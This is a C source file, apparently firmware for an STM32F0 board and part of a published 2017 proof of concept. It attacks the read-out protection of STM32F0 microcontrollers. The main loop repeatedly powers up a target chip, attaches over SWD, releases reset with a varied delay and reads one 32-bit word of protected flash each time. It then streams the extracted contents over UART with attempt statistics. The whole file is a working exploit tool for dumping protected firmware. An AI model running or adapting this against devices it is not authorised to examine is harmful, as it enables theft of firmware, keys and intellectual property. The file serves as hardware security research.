/*
 * Copyright (C) 2017 Obermaier Johannes
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */

#include <stdint.h>
#include <string.h>
#include "st/stm32f0xx.h"
#include "main.h"
#include "clk.h"
#include "swd.h"
#include "target.h"
#include "uart.h"


static swdStatus_t extractFlashData( uint32_t const address, uint32_t * const data );

static extractionStatistics_t extractionStatistics = {0u};
static uartControl_t uartControl = {0u};


/* Reads one 32-bit word from read-protection Flash memory.
   Address must be 32-bit aligned */
static swdStatus_t extractFlashData( uint32_t const address, uint32_t * const data )
{
	swdStatus_t dbgStatus = swdStatusNone;

	/* Add some jitter on the moment of attack (may increase attack effectiveness) */
	static uint16_t delayJitter = DELAY_JITTER_MS_MIN;

	uint32_t extractedData = 0u;
	uint32_t idCode = 0u;

	/* Limit the maximum number of attempts PER WORD */
	uint32_t numReadAttempts = 0u;


	/* try up to MAX_READ_TRIES times until we have the data */
	do
	{
		GPIO_LED_GREEN->ODR &= ~(0x01u << PIN_LED_GREEN);

		targetSysOn();

		waitms(5u);

		dbgStatus = swdInit( &idCode );

		if (likely(dbgStatus == swdStatusOk))
		{
			dbgStatus = swdEnableDebugIF();
		}

		if (likely(dbgStatus == swdStatusOk))
		{
			dbgStatus = swdSetAP32BitMode( NULL );
		}

		if (likely(dbgStatus == swdStatusOk))
		{
			dbgStatus = swdSelectAHBAP();
		}

		if (likely(dbgStatus == swdStatusOk))
		{
			targetSysUnReset();
			waitms(delayJitter);

			/* The magic happens here! */
			dbgStatus = swdReadAHBAddr( (address & 0xFFFFFFFCu), &extractedData );
		}

		targetSysReset();
		++(extractionStatistics.numAttempts);

		/* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */
		if (dbgStatus == swdStatusOk)
		{
			*data = extractedData;
			++(extractionStatistics.numSuccess);
			GPIO_LED_GREEN->ODR |= (0x01u << PIN_LED_GREEN);
		}
		else
		{
			++(extractionStatistics.numFailure);
			++numReadAttempts;

			delayJitter += DELAY_JITTER_MS_INCREMENT;
			if (delayJitter >= DELAY_JITTER_MS_MAX)
			{
				delayJitter = DELAY_JITTER_MS_MIN;
			}
		}

		targetSysOff();

		waitms(1u);
	}
	while ((dbgStatus != swdStatusOk) && (numReadAttempts < (MAX_READ_ATTEMPTS)));

	return dbgStatus;
}


void printExtractionStatistics( void )
{
	uartSendStr("Statistics: \r\n");

	uartSendStr("Attempts: 0x");
	uartSendWordHexBE(extractionStatistics.numAttempts);
	uartSendStr("\r\n");

	uartSendStr("Success: 0x");
	uartSendWordHexBE(extractionStatistics.numSuccess);
	uartSendStr("\r\n");

	uartSendStr("Failure: 0x");
	uartSendWordHexBE(extractionStatistics.numFailure);
	uartSendStr("\r\n");
}


int main()
{
	/* Enable all GPIO clocks */
	RCC->AHBENR |= RCC_AHBENR_GPIOAEN | RCC_AHBENR_GPIOBEN | RCC_AHBENR_GPIOCEN | RCC_AHBENR_GPIODEN | RCC_AHBENR_GPIOEEN | RCC_AHBENR_GPIOFEN;
	targetSysCtrlInit();
	swdCtrlInit();
	uartInit();

	clkEnablePLLInt();
	clkEnableSystick();

	/* Board LEDs */
	GPIO_LED_BLUE->MODER |= (0x01u << (PIN_LED_BLUE << 1u));
	GPIO_LED_GREEN->MODER |= (0x01u << (PIN_LED_GREEN << 1u));
	GPIO_LED_BLUE->OSPEEDR |= (0x03 << (PIN_LED_BLUE << 1u));
	GPIO_LED_GREEN->OSPEEDR |= (0x03u << (PIN_LED_GREEN << 1u));
	GPIO_LED_BLUE->ODR |= (0x01u << PIN_LED_BLUE);



	uartControl.transmitHex = 0u;
	uartControl.transmitLittleEndian = 1u;
	uartControl.readoutAddress = 0x00000000u;
	uartControl.readoutLen = (64u * 1024u);
	uartControl.active = 0u;


	uint32_t readoutInd = 0u;
	uint32_t flashData = 0xFFFFFFFFu;
	uint32_t btnActive = 0u;
	uint32_t once = 0u;
	swdStatus_t status = swdStatusOk;

	while (1u)
	{
		uartReceiveCommands( &uartControl );

		/* Start as soon as the button B1 has been pushed */
		if (GPIO_BUTTON->IDR & (0x01u << (PIN_BUTTON)))
		{
			btnActive = 1u;
		}

		if (uartControl.active || btnActive)
		{
			/* reset statistics on extraction start */
			if (!once)
			{
				once = 1u;

				extractionStatistics.numAttempts = 0u;
				extractionStatistics.numSuccess = 0u;
				extractionStatistics.numFailure = 0u;
			}

			status = extractFlashData((uartControl.readoutAddress + readoutInd), &flashData);

			if (status == swdStatusOk)
			{

				if (!(uartControl.transmitHex))
				{
					uartSendWordBin( flashData, &uartControl );
				}
				else
				{
					uartSendWordHex( flashData, &uartControl );
					uartSendStr(" ");
				}

				readoutInd += 4u;
			}
			else
			{
				if (uartControl.transmitHex)
				{
					uartSendStr("\r\n!ExtractionFailure");
					uartSendWordHexBE( status );
				}
			}

			if ((readoutInd >= uartControl.readoutLen) || (status != swdStatusOk))
			{
				btnActive = 0u;
				uartControl.active = 0u;
				readoutInd = 0u;
				once = 0u;

				/* Print EOF in HEX mode */
				if (uartControl.transmitHex != 0u)
				{
					uartSendStr("\r\n");
				}
			}
		}
	}

	return 0u;
}
